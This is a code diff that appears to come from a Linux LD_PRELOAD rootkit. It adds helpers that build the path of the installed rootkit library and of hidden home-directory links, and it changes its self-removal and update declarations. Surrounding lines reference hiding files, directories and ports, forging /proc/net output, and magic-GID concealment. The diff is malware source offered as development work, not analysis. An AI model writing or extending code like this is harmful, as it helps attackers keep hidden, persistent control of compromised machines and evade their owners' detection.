@@ -42,6 +42,16 @@ int isfedora(void){
     return 0;
 }
 
+char *rksopath(char *installdir, char *bdvlso){
+    size_t pathsize=strlen(installdir)+strlen(bdvlso)+256;
+    char *ret = malloc(pathsize+1);
+    if(!ret) return NULL;
+    memset(ret, 0, pathsize+1);
+    snprintf(ret, pathsize, "%s/%s.$PLATFORM", installdir, bdvlso);
+    if(isfedora()) ret[strlen(ret)-10]='\0';
+    return ret;
+}
+
 char *gdirname(int fd){
     int readlink_status;
     char path[128], *filename = malloc(PATH_MAX+1);
@@ -164,6 +174,21 @@ void fcloser(int c, ...){
     va_end(va);
 }
 
+char *linkdest(int dest){
+    char *name, *ret;
+    size_t pathsize;
+
+    name = linkdests[dest];
+    pathsize = LEN_HOMEDIR+strlen(name)+2;
+    
+    ret = malloc(pathsize);
+    if(!ret) return NULL;
+    memset(ret, 0, pathsize);
+    snprintf(ret, pathsize, "%s/%s", HOMEDIR, name);
+
+    return ret;
+}
+
 int _hidden_path(const char *pathname, short mode);
 int _f_hidden_path(int fd, short mode);
 int _l_hidden_path(const char *pathname, short mode);
@@ -191,7 +216,7 @@ int logcount(const char *path);
 #include "log.c"
 #endif
 
-int rknomore(void);
+int rknomore(char *installdir, char *bdvlso);
 #include "nomore.c"
 
 #ifdef HIDE_PORTS
@@ -201,6 +226,7 @@ int hideport_alive(void);
 FILE *forge_procnet(const char *pathname);
 #endif
 
+void bdvupdate(char *const argv[]);
 void eradicatedir(const char *target);
 void hidedircontents(const char *target, gid_t magicgid);
 #include "magic/magic.h"
